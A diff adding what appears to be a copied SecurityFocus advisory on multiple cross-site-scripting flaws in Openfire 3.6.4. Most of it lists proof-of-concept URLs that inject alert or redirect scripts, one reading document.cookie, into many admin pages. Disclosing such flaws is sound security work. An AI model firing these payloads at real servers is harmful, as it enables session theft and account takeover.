@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/45682/info
+
+Openfire is prone to multiple cross-site-scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials; other attacks are also possible.
+
+Openfire 3.6.4 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/login.jsp?url=&username=test" onfocus=javascript:window.location.assign(&#039;http://www.google.com&#039;);">
+
+http://www.example.com/login.jsp?url=hello" onfocus=javascript:window.location.assign(&#039;http://www.google.com&#039;);">
+
+http://www.example.com/security-audit-viewer.jsp?range=15&username="><script>alert(&#039;xss&#039;)</script>&search=Search
+
+http://www.example.com/user-create.jsp?username=test"><script>alert(&#039;xss&#039;)</script>
+
+http://www.example.com/user-create.jsp?name=test"><script>alert(&#039;xss&#039;)</script>
+
+http://www.example.com/user-create.jsp?email=test"><script>alert(&#039;xss&#039;)</script>
+
+http://www.example.com/plugins/search/advance-user-search.jsp?criteria=test"><script>alert(&#039;xss&#039;)</script>
+
+http://www.example.com/user-roster-add.jsp?username=test<script>alert(&#039;xss&#039;)</script>
+
+http://www.example.com/user-roster-add.jsp?username=user&jid=1&nickname=<script>alert(&#039;XSS&#039;)</script>&email=<script>alert(&#039;XSS&#039;)</script>&add=Add+Item
+
+http://www.example.com/user-roster.jsp?username=test<script>alert(document.cookie)</script>
+
+http://www.example.com/user-lockout.jsp?username=test<script>alert(&#039;xss&#039;)</script>
+
+http://www.example.com/group-create.jsp?name=test<script>alert(&#039;xss&#039;)</script>&description=<script>alert(&#039;xss&#039;)</script>&create=Create+Group
+
+http://www.example.com/group-edit.jsp?creategroupsuccess=true&group=test<script>alert(&#039;xss&#039;)</script>
+
+http://www.example.com/group-delete.jsp?group=<script>alert(&#039;xss&#039;)</script>
+
+
+http://www.example.com/muc-room-edit-form.jsp?save=true&create="><script>alert(&#039;XSS&#039;)</script>&roomconfig_persistentroom="><script>alert(&#039;XSS&#039;)</
+script>&roomName=23&mucName=conference&roomconfig_roomname=<script>alert(&#039;XSS&#039;)</script>&roomconfig_roomdesc=<script>alert(&#039;XSS&#039;)</script>&room_
+topic=<script>alert(&#039;XSS&#039;)</script>&roomconfig_maxusers="><script>alert(&#039;XSS&#039;)</script>&roomconfig_presencebroadcast=<script>alert(&#039;XSS&#039;)</scrip
+t>true&roomconfig_presencebroadcast2="><script>alert(&#039;XSS&#039;)</script>&roomcofig_presencebroadcast3=true"><script>alert(&#039;XSS&#039;)</script>&roomconfi
+g_roomsecret="><script>alert(&#039;XSS&#039;)</script>&roomconfig_roomsecret2="><script>alert(&#039;XSS&#039;)</script>&roomconfig_whois=moderator"><script>alert(&#039;X
+SS&#039;)</script>&roomconfig_publicroom=true"><script>alert(&#039;XSS&#039;)</script>&roomconfig_canchangenick=true"><script>alert(&#039;XSS&#039;)</script>&roomconfig_
+registration=true"><script>alert(&#039;XSS&#039;)</script>&Submit=Save+Changes
+
+http://www.example.com/muc-room-delete.jsp?roomJID="><script>alert(&#039;XSS&#039;)</script>&create=false
+
+http://www.example.com/plugins/clientcontrol/create-bookmark.jsp?urlName="><script>alert(&#039;XSS&#039;)</script>&url="><script>alert(&#039;XSS&#039;)</script>&user
+s="><script>alert(&#039;XSS&#039;)</script>&groups="><script>alert(&#039;XSS&#039;)</script>&rss=off&createURLBookmark=Create&type=url
+
+http://www.example.com/plugins/clientcontrol/spark-form.jsp?optionalMessage=&lt;/textarea&gt;<script>alert(&#039;XSS&#039;)</script>&submit=Update+Spark+Versions
